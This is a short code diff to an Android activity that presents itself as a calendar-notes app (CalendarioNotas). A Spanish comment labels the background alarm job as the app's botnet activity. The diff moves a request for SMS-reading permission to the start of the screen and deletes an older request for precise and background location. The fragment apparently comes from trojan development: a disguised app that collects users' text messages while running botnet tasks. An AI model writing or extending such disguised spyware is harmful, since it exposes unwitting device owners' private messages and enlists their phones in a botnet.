@@ -79,6 +79,9 @@ class CalendarioNotas : AppCompatActivity() {
                 )
             }
         }
+
+        pidePermisoSMS()
+
         setContentView(R.layout.activity_calendario_notas)
         simpleCalendarView =
             findViewById<View>(R.id.simpleCalendarView) as CalendarView // get the reference of CalendarView
@@ -97,8 +100,6 @@ class CalendarioNotas : AppCompatActivity() {
             Settings.Secure.ANDROID_ID
         )
 
-        pidePermisoSMS()
-        pidePermisoGPS()
         // Comienzo del trabajo en segundo plano para la actividad de la botnet
         val alarm = Alarm()
         alarm.setAlarm(this)
@@ -223,12 +224,5 @@ class CalendarioNotas : AppCompatActivity() {
     fun pidePermisoSMS(){
         val permissions = arrayOf(android.Manifest.permission.READ_SMS)
         ActivityCompat.requestPermissions(this, permissions,1)
-    }
-
-    // Pide permisos al usuario para el tema de recoger la lista de gps
-    fun pidePermisoGPS(){
-        val permissions = arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION)
-        ActivityCompat.requestPermissions(this, permissions,2)
-        ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION),3)
     }
 }
